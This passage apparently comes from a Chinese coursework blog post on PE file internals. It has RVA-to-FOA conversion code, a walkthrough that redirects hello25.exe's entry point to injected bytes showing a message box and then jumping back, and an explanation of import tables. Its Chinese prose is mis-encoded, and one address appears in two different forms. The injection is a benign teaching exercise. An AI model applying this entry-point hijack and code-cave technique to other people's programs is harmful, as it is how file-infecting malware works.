OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br> <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;YOU_PATH_TO_EXE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-comment">//Choose one to execute</span><br>    <span class="hljs-comment">//printf(&quot;%X&quot;,RVA_TO_FOA(RVA,buffer));</span><br>    <span class="hljs-comment">//printf(&quot;%X&quot;,FOA_TO_RVA(FOA,buffer));</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-ä¿®æ”¹hello25-exeçš„ä»£ç æ®µï¼Œä½¿å…¶å¼¹å‡ºç¬¬ä¸‰ä¸ªæ¶ˆæ¯æ¡†ï¼ˆåŒ…å«è‡ªå·±å­¦å·å’Œå§“åï¼‰"><a href="#3-ä¿®æ”¹hello25-exeçš„ä»£ç æ®µï¼Œä½¿å…¶å¼¹å‡ºç¬¬ä¸‰ä¸ªæ¶ˆæ¯æ¡†ï¼ˆåŒ…å«è‡ªå·±å­¦å·å’Œå§“åï¼‰" class="headerlink" title="3.ä¿®æ”¹hello25.exeçš„ä»£ç æ®µï¼Œä½¿å…¶å¼¹å‡ºç¬¬ä¸‰ä¸ªæ¶ˆæ¯æ¡†ï¼ˆåŒ…å«è‡ªå·±å­¦å·å’Œå§“åï¼‰"></a>3.ä¿®æ”¹hello25.exeçš„ä»£ç æ®µï¼Œä½¿å…¶å¼¹å‡ºç¬¬ä¸‰ä¸ªæ¶ˆæ¯æ¡†ï¼ˆåŒ…å«è‡ªå·±å­¦å·å’Œå§“åï¼‰</h3><p>  è¿™é‡Œæˆ‘çš„æ€è·¯ä¹Ÿæ˜¯ä¿®æ”¹OEPï¼Œç„¶åjmpå›åŸæ¥çš„ä»£ç å¤„</p><p>å…ˆåœ¨åŸæ–‡ä»¶å¤„æŸ¥æ‰¾ä¸€äº›ç©ºç™½åŒºï¼ˆæ²¡æœ‰æƒé™ï¼Œå°±ç»™ä»–åŠ æƒé™å°±æ˜¯äº†ï¼‰ï¼Œå¡«å…¥å­¦å·å§“å</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20213759.png"></p><p>ç„¶åç¼–å†™å¼¹çª—å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯4ä¸ªpushå’Œ1ä¸ªcallï¼Œå¯ä»¥çœ‹çœ‹åŸæ¥çš„æ˜¯æ€ä¹ˆè°ƒç”¨çš„ï¼Œ</p><p>è¿™é‡Œ<code>push</code>æ“ä½œç æ˜¯<code>0x68</code>,<code>call</code>çš„æ“ä½œç æ˜¯<code>0xE8</code>ï¼Œ<code>jmp</code>çš„æ“ä½œç æ˜¯<code>0xE9</code>ï¼Œè¿™ä¸¤ä¸ªåé¢éƒ½è·Ÿä¸€ä¸ª4å­—èŠ‚åœ°å€ï¼Œå…ˆæŠŠæ“ä½œç å¡«å…¥</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214130.png"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å…ˆä¿®æ”¹OEPï¼Œæ£€æŸ¥æ˜¯å¦æ­£ç¡®è®¾ç½®ã€‚</p><p>ä¿®æ”¹OEPä¹Ÿå°±æ˜¯ä¿®æ”¹<code>AddressOfEntryPoint</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦è®¡ç®—<code>0x8B0</code>çš„RVAç„¶åå¡«å…¥ã€‚</p><p>è¿™é‡Œå°±åˆ©ç”¨åˆšåˆšè´´å‡ºçš„ä»£ç ç›´æ¥è®¡ç®—äº†(åç»­ä¸å†è´´å‡ºè®¡ç®—æˆªå›¾ï¼Œæ— éå°±æ˜¯æ¢ä¸ªæ•°æ®ï¼Œæ¢ä¸ªå‡½æ•°è€Œå·²)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214749.png"></p><p>å¯è§æ˜¯RVAæ˜¯<code>30B0</code>ï¼Œé‚£ä¹ˆå°±æŠŠ<code>AddressOfEntryPoint</code>æ”¹ä¸º<code>30B0</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214818.png"></p><p>ç„¶åå†æ‹–å…¥<code>x32dbg</code>ï¼ŒæŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214849.png"></p><p>å‘ç°å·²ç»ä¿®æ”¹æˆåŠŸï¼Œåªå·®è®¡ç®—é‚£å‡ ä¸ªåœ°å€äº†ï¼</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨ç¬¬äºŒç¬¬ä¸‰ä¸ªpushçš„å€¼å’Œcallä»¥åŠjmpçš„å€¼ï¼Œå¦å¤–ä¸¤ä¸ªpushä¸æ˜¯å¾ˆé‡è¦ã€‚</p><p>è¿™é‡Œè¦æ³¨æ„ï¼Œä¸ç®¡æˆ‘ä»¬æ˜¯pushè¿˜æ˜¯è¿›è¡Œè·³è½¬ï¼Œå®ƒè·Ÿçš„æ“ä½œæ•°éƒ½æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€æ˜¯éƒ½æ˜¯åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå¹¶ä¸æ˜¯FOAã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦è®¡ç®—ä¸€ä¸‹æˆ‘ä»¬å¡«å…¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸²çš„RVAæ˜¯å¤šå°‘ï¼Œåœ¨è¿™é‡Œæˆ‘çš„å­¦å·FOAæ˜¯<code>0x890</code>ï¼Œå®ƒå¯¹åº”çš„RVAæ˜¯<code>0x3090</code>ï¼Œå§“åçš„FOAæ˜¯<code>0x8A0</code>ï¼Œå…¶å¯¹åº”çš„RVAæ˜¯<code>0x30A0</code>ï¼Œé‚£ä¹ˆå°±æŠŠRVAåŠ ä¸Š<code>ImageBase</code>å°±å¾—åˆ°åœ¨å†…å­˜ä¸­çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<code>0x403090</code> <code>0x4030A0</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20215805.png"></p><p>NOTEï¼šä¿®æ”¹çš„æ—¶å€™æ³¨æ„å°ç«¯åº</p><p>å†æ‹–å…¥x32dbgæŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20215847.png"></p><p>å‘ç°å¯ä»¥æˆåŠŸæ‰¾åˆ°å­—ç¬¦ä¸²ï¼Œç°åœ¨å°±æ˜¯è¦è®¡ç®—è·³è½¬åœ°å€</p><p>åœ¨win32ç¨‹åºé‡Œé¢è·³è½¬åœ°å€æ˜¯è¿™æ ·è®¡ç®—çš„ï¼š<code>è¦è·³è½¬çš„åœ°å€-ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</code></p><p>æ¯”æ–¹è¯´æœ‰ä¸€ä¸ªæŒ‡ä»¤<code>call a</code>ï¼Œè¿™æ¡æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯<code>0x1010</code>ï¼Œaçš„åœ°å€æ˜¯<code>0x1008</code>ï¼Œé‚£ä¹ˆå…¶ç¡¬ç¼–ç å°±æ˜¯<code>E8 8</code>ï¼Œå³<code>E8 0x1010 - 0x1008</code></p><p>æ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°<code>MessageBoxA</code>çš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è°ƒç”¨è¿™ä¸ªå‡½æ•°</p><p>è¿™é‡Œè´´å‡ºå¦‚ä½•å¯»æ‰¾çš„æˆªå›¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20220557.png"></p><p>å¯ä»¥çœ‹åˆ°<code>MessageBoxA</code>çš„åœ°å€æ˜¯<code>0x767F9050</code>(ä¸åŒç”µè„‘ä¼šä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä½ è·Ÿæˆ‘çš„ä¸ä¸€æ ·ä¹Ÿæ­£å¸¸ï¼‰ï¼Œ<code>call</code>çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯<code>0x4030C9</code>ï¼ˆä½†è¿™ä¸ªåº”è¯¥ä¸€æ ·ï¼‰ï¼Œé‚£ä¹ˆæ“ä½œç å°±åº”è¯¥è¿™æ ·è®¡ç®—<code>0x767F9D50 - 0x4030C9</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221606.png"></p><p>åŒç†<code>jmp</code>çš„æ“ä½œç ä¹Ÿæ˜¯è¿™æ ·è®¡ç®—ï¼Œæˆ‘ä»¬éœ€è¦è·³å›åŸæ¥çš„OEPå¤„å³<code>0x401000</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221222.png"></p><p>åˆ†åˆ«å¾—åˆ°<code>call</code>çš„æ“ä½œç <code>763F5F87</code>å’Œ<code>jmp</code>çš„æ“ä½œç <code>FFFFDF32</code>ï¼Œç°åœ¨å†™å…¥æ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥åœ¨x32dbgé‡Œé¢patchï¼‰</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221656.png"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221718.png"></p><p>ç°åœ¨å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„å¼¹çª—äº†</p><h3 id="4-ä¿®æ”¹hello25-exeï¼Œåˆ é™¤æ–‡ä»¶ä¸­å¼•å…¥å‡½æ•°èŠ‚çš„MessageBoxAå­—ç¬¦ä¸²ï¼Œä¹‹åè‡ªè¡Œè¿›è¡Œç›¸åº”è°ƒæ•´ï¼Œä½¿å¾—hello25-exeå¼¹æ¡†åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚"><a href="#4-ä¿®æ”¹hello25-exeï¼Œåˆ é™¤æ–‡ä»¶ä¸­å¼•å…¥å‡½æ•°èŠ‚çš„MessageBoxAå­—ç¬¦ä¸²ï¼Œä¹‹åè‡ªè¡Œè¿›è¡Œç›¸åº”è°ƒæ•´ï¼Œä½¿å¾—hello25-exeå¼¹æ¡†åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚" class="headerlink" title="4.ä¿®æ”¹hello25.exeï¼Œåˆ é™¤æ–‡ä»¶ä¸­å¼•å…¥å‡½æ•°èŠ‚çš„MessageBoxAå­—ç¬¦ä¸²ï¼Œä¹‹åè‡ªè¡Œè¿›è¡Œç›¸åº”è°ƒæ•´ï¼Œä½¿å¾—hello25.exeå¼¹æ¡†åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚"></a>4.ä¿®æ”¹hello25.exeï¼Œåˆ é™¤æ–‡ä»¶ä¸­å¼•å…¥å‡½æ•°èŠ‚çš„MessageBoxAå­—ç¬¦ä¸²ï¼Œä¹‹åè‡ªè¡Œè¿›è¡Œç›¸åº”è°ƒæ•´ï¼Œä½¿å¾—hello25.exeå¼¹æ¡†åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“å¼•å…¥å‡½æ•°èŠ‚æ˜¯ä¸ªå•¥ä¸œè¥¿ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å’‹ç”¨çš„</p><p>å…¶å®å¼•å…¥å‡½æ•°èŠ‚å°±æ˜¯å¯¼å…¥è¡¨ï¼Œæ‰€è°“çš„å¯¼å…¥è¡¨å°±æ˜¯å°±ç›¸å½“äºå‘Šè¯‰åˆ«äººè‡ªå·±è¦ç”¨ä»€ä¹ˆã€‚å®ƒå¯ä»¥é€šè¿‡OptionalHeaderæ•°æ®ç›®å½•é¡¹çš„ç¬¬äºŒé¡¹æ‰¾åˆ°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142243765.png"></p><p>åŒç†è¿™ä¸ªVirtualAddressä¹Ÿæ˜¯ä¸€ä¸ªRVAï¼Œéœ€è¦è½¬åŒ–ä¸ºFOAåæ‰èƒ½åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°çœŸæ­£çš„å¯¼å…¥è¡¨ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <br>        DWORD   OriginalFirstThunk; <span class="hljs-comment">// æŒ‡å‘ å¯¼å…¥åç§°è¡¨INTï¼ˆImportNameTableï¼‰çš„RVA</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <br>    DWORD   ForwarderChain;                 <br>    DWORD   Name;                   <span class="hljs-comment">// æŒ‡å‘ DLLåç§°çš„åœ°å€ RVA</span><br>    DWORD   FirstThunk;             <span class="hljs-comment">// æŒ‡å‘ å¯¼å…¥åœ°å€è¡¨IATï¼ˆImportAddressTableï¼‰çš„RVA</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>OrginalFirstThunk</code>å’Œ<code>FirstThunk</code>å„è‡ªå†æŒ‡å‘ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯INTè¡¨å’ŒIATè¡¨ï¼Œ<code>name</code>åˆ™æ˜¯è¦ç”¨åˆ°çš„dllçš„åå­—ã€‚åœ¨è¿›ä¸€æ­¥è§£æIATè¡¨å’ŒINTè¡¨ä¹‹å‰ï¼Œå…ˆåšä¸ªå®éªŒã€‚</p><p>éšä¾¿ä½¿ç”¨è°ƒè¯•å™¨æ‰“å¼€ä¸€ä¸ªPEæ–‡ä»¶ï¼ˆæˆ‘è¿™é‡Œå°±æ²¡æœ‰ç”¨è€å¸ˆç»™å‡ºçš„æ–‡ä»¶äº†ï¼Œä½†è¿‡ç¨‹éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œå¤§å®¶ä¾è‘«èŠ¦ç”»ç“¢å°±å¥½å•¦ï¼‰ï¼Œåœ¨é‡Œé¢æ‰¾ä¸€æ‰¾ä¸€äº›ä½¿ç”¨äº†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142331070.png"></p><p>æ¯”å¦‚è¿™é‡Œï¼Œå®é™…ä¸Šè¿™æ¡æŒ‡ä»¤å°±æ˜¯<code>mov rax ds:[4083b0]</code>ï¼ˆå¤§å®¶å¯ä»¥æ£é¼“æ£é¼“æ€ä¹ˆåœ¨x32é‡Œé¢çœ‹å®é™…æŒ‡ä»¤ï¼‰ï¼Œåœ¨å†…å­˜ä¸­è½¬å»4083B0è¿™ä¸ªåœ°å€ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142334814.png"></p><p>ä¹Ÿå°±æ˜¯è¯´4083B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„æ˜¯7FFFE86C3190ï¼Œå€ŸåŠ©äºè°ƒè¯•å™¨å¾ˆæ–¹ä¾¿çš„çŸ¥é“è¿™ä¸ªåœ°å€å°±æ˜¯MessageBoxAçš„å‡½æ•°åœ°å€ï¼Œè¿™æ¡æŒ‡ä»¤ä¹Ÿå°±ç­‰ä»·äºæŠŠMessageBoxaçš„åœ°å€ç»™raxï¼Œç„¶åå†è°ƒç”¨æ­¤å‡½æ•°ã€‚</p><p>è€Œæˆ‘ä»¬åœ¨æ–‡ä»¶ä¸­å»çœ‹çœ‹4083B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„æ˜¯ä»€ä¹ˆå‘¢ï¼ˆè¿™é‡Œè¦å‡å»ImageBaseå¾—åˆ°83B0ï¼ŒåŒæ—¶RVAè½¬æ¢FOAï¼Œæ‰èƒ½åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œæ­¤åœ°å€åœ¨æ–‡ä»¶ä¸­å¯¹åº”çš„åœ°å€ä¸º37B0</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142341414.png"></p><p>37B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„åˆ™æ˜¯ä¸€ä¸ª86F6ï¼Œå¾ˆæ˜¾ç„¶ä¸è¿è¡Œæ—¶å­˜æ”¾çš„å€¼ä¸ä¸€æ ·ã€‚ç»§ç»­æ·±ç©¶86F6åˆæ˜¯ä»€ä¹ˆï¼Œé¦–å…ˆè¿™æ˜¯ä¸€ä¸ªRVAï¼Œå°†å…¶è½¬æ¢ä¸ºFOAåï¼Œå¾—åˆ°3AF6</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142344785.png"></p><p>å½“åœ¨æ–‡ä»¶ä¸­è½¬å»3AF6æ—¶ï¼Œå°±ä¼šæ„æ–™ä¸­åœ°å‘ç°å±…ç„¶å°±æ˜¯MessageBoxAè¿™ä¸ªå‡½æ•°åå­—ï¼Œè™½ç„¶å‰é¢è¿˜å¸¦äº†E9 01ä¸¤å­—èŠ‚ä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨å†…å­˜ä¸­4083B0å­˜æ”¾çš„æ˜¯MessageBoxAçš„åœ°å€ï¼Œè€Œæ–‡ä»¶ä¸­åˆ™å¯¹åº”å­˜æ”¾çš„æ˜¯MessageBoxAçš„åå­—çš„RVAã€‚æ¢å¥è¯è¯´å­˜æ”¾çš„ä¸œè¥¿ä¸ä¸€æ ·ï¼Œä½†ä¸¤è€…ä¹‹é—´è‚¯å®šæœ‰ä¸€å®šçš„è”ç³»ã€‚å®é™…ä¸Šï¼Œ3AF6å¤„å°±æ˜¯IATè¡¨ä¸­çš„ä¸€é¡¹ã€‚</p><p>ç›®å‰å¯ä»¥æ˜ç¡®çš„æ˜¯IATè¡¨è¿è¡Œå‰è¿è¡Œåç¡®å®ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™å…¶å®å°±è·ŸPEæ–‡ä»¶åŠ è½½è¿‡ç¨‹æœ‰å…³äº†ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p><p>åœ¨PEæ–‡ä»¶åŠ è½½ä¹‹å‰ï¼ŒINTè¡¨å’ŒIATè¡¨æŒ‡å‘åŒä¸€å—åœ°æ–¹ï¼Œæ¢å¥è¯è¯´INTè¡¨å’ŒIATè¡¨åœ¨è¿è¡Œå‰æ˜¯å®Œå…¨ä¸€æ ·çš„ä½†æ˜¯ç‹¬ç«‹çš„ä¸¤å¼ è¡¨ï¼Œåœ¨å¤šæ•°æƒ…å†µä¸‹å®ƒä»¬å¤„äºä¸åŒçš„åœ°å€å¤„ï¼Œä½†æ˜¯å­˜æ”¾ç›¸åŒçš„å€¼ã€‚åœ¨PEæ–‡ä»¶åŠ è½½ä¹‹åï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæ ¹æ®INTè¡¨å»æ‰¾é‚£äº›å‡½æ•°åœ°å€ï¼Œæ¯”å¦‚MesaageBoxAçš„åœ°å€ï¼Œç„¶åå¡«å…¥IATè¡¨ä¸­ã€‚</p><p>ç°åœ¨å†æ¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹PEæ–‡ä»¶çš„åŠ è½½</p><ul><li>é¦–å…ˆæ“ä½œç³»ç»Ÿç»™exeæ–‡ä»¶åˆ†é…4GBçš„è™šæ‹Ÿç©ºé—´ï¼Œç„¶åæŠŠexeæœ¬èº«çš„ä»£ç åŠ è½½åˆ°ImageBaseå¤„ï¼Œé€šå¸¸æ¥è¯´exeæ˜¯é¦–å…ˆåŠ è½½çš„ï¼Œå¾€å¾€éƒ½èƒ½é¢„è®¡åŠ è½½åˆ°ImageBaseå¤„ï¼Œå› æ­¤ä¸éœ€è¦ä½¿ç”¨é‡å®šä½è¡¨ä¿®æ”¹ã€‚</li><li>å…¶æ¬¡ï¼Œæ“ä½œç³»ç»Ÿå¾€4GBç©ºé—´ä¸­åŠ è½½å„ç§DLLæ–‡ä»¶ï¼Œç”±äºDLLæ–‡ä»¶å¾€å¾€ä¼šæœ‰å†²çªï¼Œä¸èƒ½æŒ‰ç…§é¢„è®¡ImageBaseè£…è½½ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨DLLæœ¬èº«æä¾›çš„é‡å®šä½è¡¨ä¿®å¤è‡ªå·±çš„åœ°å€</li><li>å¾…æ‰€æœ‰DLLéƒ½åŠ è½½å¹¶ä¿®å¤å®Œåï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®exeçš„INTè¡¨å»æ‰¾å‡½æ•°åœ°å€ï¼Œæ‰¾åˆ°ä¸€ä¸ªåœ°å€å°±å¡«å…¥IATè¡¨ä¸­ï¼Œéå†å®ŒINTè¡¨ä¹Ÿå°±éå†å®ŒIATè¡¨ï¼Œç”±æ­¤å®Œæˆå¯¹IATè¡¨çš„ä¿®æ”¹ï¼ˆè¿™ä¸ªæ‰¾å‡½æ•°åœ°å€çš„è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨GetPrcoAddressè¿™ä¸ªå‡½æ•°ï¼‰</li><li>æ­¤æ—¶INTè¡¨å­˜å‚¨äº†å‡½æ•°åç§°æˆ–è€…åºå·ï¼ŒIATè¡¨å­˜å‚¨äº†å¯¹åº”çš„å‡½æ•°åœ°å€ï¼Œæƒ³è¦ä½¿ç”¨DLLä¸€ä¸ªå‡½æ•°ä¹Ÿå°±ç®€å•äº†ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶åŠ è½½å‰åINTè¡¨ä¸å˜ï¼Œæ–‡ä»¶åŠ è½½å‰IATè¡¨å’ŒINTè¡¨ç›¸åŒï¼Œæ–‡ä»¶åŠ è½½åIATè¡¨å‘ç”Ÿå˜åŒ–</p><p>é‚£ä¹ˆINTè¡¨æ˜¯å¦‚ä½•å­˜å‚¨å‡½æ•°åç§°æˆ–è€…åºå·å‘¢ï¼Ÿ</p><p>å…ˆæ¥çœ‹çœ‹INTè¡¨è¡¨é¡¹ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        PBYTE  ForwarderString;<br>        PDWORD Function;<br>        DWORD Ordinal; <span class="hljs-comment">//åºå·</span><br>        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="hljs-comment">//æŒ‡å‘IMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™æ˜¯ä¸ªè”åˆä½“ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç»“æ„å®½åº¦æ˜¯4ä¸ªå­—èŠ‚ï¼Œè™½ç„¶çœ‹èµ·æ¥è¿™ä¸ªè”åˆä½“å­˜æ”¾äº†å¾ˆå¤šä¸œè¥¿ã€‚ä½†åˆæœ€ç®€å•çš„æ–¹æ³•åˆ¤æ–­ï¼Œå¦‚æœè¿™4ä¸ªå­—èŠ‚æœ€é«˜ä½æ˜¯1ï¼Œé‚£ä¹ˆå‰©ä¸‹31ä½å°±ä»£è¡¨å‡½æ•°åºå·ï¼›å¦‚æœæœ€é«˜ä½ä¸ä¸º1ï¼Œé‚£ä¹ˆå‰©ä¸‹31ä¸ºå°±ä»£è¡¨ä¸€ä¸ªRVAæŒ‡å‘å¦ä¸€ä¸ªç»“æ„<code>IMAGE_IMPORT_BY_NAME</code>ï¼Œå³<code>if(INT &amp; 0x80000000 == 0x80000000) :åºå·å¯¼å‡º else RVA = IMAGE_IMPORT_BY_NAME</code></p><p>è¿™ä¸ªIMAGE_IMPORT_BY_NAMEç»“æ„ä¹Ÿç®€å•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<span class="hljs-comment">//å¯èƒ½ä¸ºç©ºï¼Œç¼–è¯‘å™¨å†³å®š å¦‚æœä¸ä¸ºç©º æ˜¯å‡½æ•°åœ¨å¯¼å‡ºè¡¨ä¸­çš„ç´¢å¼•</span><br>    BYTE    Name[<span class="hljs-number">1</span>];    <span class="hljs-comment">//å‡½æ•°åç§°ï¼Œä»¥0ç»“å°¾</span><br>&#125; IMAGE_IMPORT_BY_NAME<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæˆå‘˜å°±æŒ‡å‘åå­—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚</p><p>IATè¡¨å’ŒINTè¡¨åœ¨åŠ è½½å‰æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œå…¶ç»“æ„ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå®ƒä»¬çš„æˆå‘˜éƒ½ä¼šæŒ‡å‘ç›¸åŒçš„åºå·æˆ–è€…IMAGE_IMPORT_BY_NAMEç»“æ„</p><p>è‡³æ­¤ä½ åº”è¯¥æ˜ç™½INTä»¥åŠIATæ˜¯ä»€ä¹ˆï¼Œä»–ä»¬æ˜¯å¦‚ä½•äº’ç›¸è”ç³»çš„ï¼Œé‚£ä¹ˆå°±æ¥æ‰¾ä¸€æ‰¾<code>hello25.exe</code>çš„å¯¼å…¥è¡¨å§ï¼</p><p>åŒæ ·åˆ©ç”¨PEç›¸å…³å·¥å…·å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ‰¾åˆ°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20224753.png"></p><p>åœ¨<code>0x614</code>å¤„</p><p>æ¥åˆ’åˆ†ä¸€ä¸‹ç»“æ„å§</p><p><img 